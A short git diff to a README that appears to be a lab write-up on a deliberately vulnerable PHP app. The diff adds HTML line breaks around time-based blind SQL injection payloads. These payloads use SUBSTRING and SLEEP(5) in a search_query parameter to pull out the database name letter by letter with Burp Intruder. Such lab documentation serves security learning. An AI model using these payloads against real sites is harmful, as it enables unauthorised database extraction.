@@ -38,9 +38,9 @@ Vulnerability detection with :
 ![image](https://github.com/MeryemDalgali/vulnerable-to-sqli/assets/123389001/1b117164-ff3a-4df5-96de-5c8402df0b84)
 
 I got 5 second delay as shown in the tool
-According to 5 seconds of sleep, I got the first letter of the database with this payload: 
-search.php?search_query=Ethical Hacking Handbook' AND IF(SUBSTRING(database(),1,1)='B',SLEEP(5),0) -- -
-Other letters can also be obtained with the intruder tool of the burp tool.For example, to find the second letter of the database:
+According to 5 seconds of sleep, I got the first letter of the database with this payload: <br></br>
+search.php?search_query=Ethical Hacking Handbook' AND IF(SUBSTRING(database(),1,1)='B',SLEEP(5),0) -- -<br></br>
+Other letters can also be obtained with the intruder tool of the burp tool.For example, to find the second letter of the database:<br></br>
 search.php?search_query=Ethical Hacking Handbook' AND IF(SUBSTRING(database(),2,1)='$set_ıntruder',SLEEP(5),0) -- -
 
 # ERROR-BASED SQLI
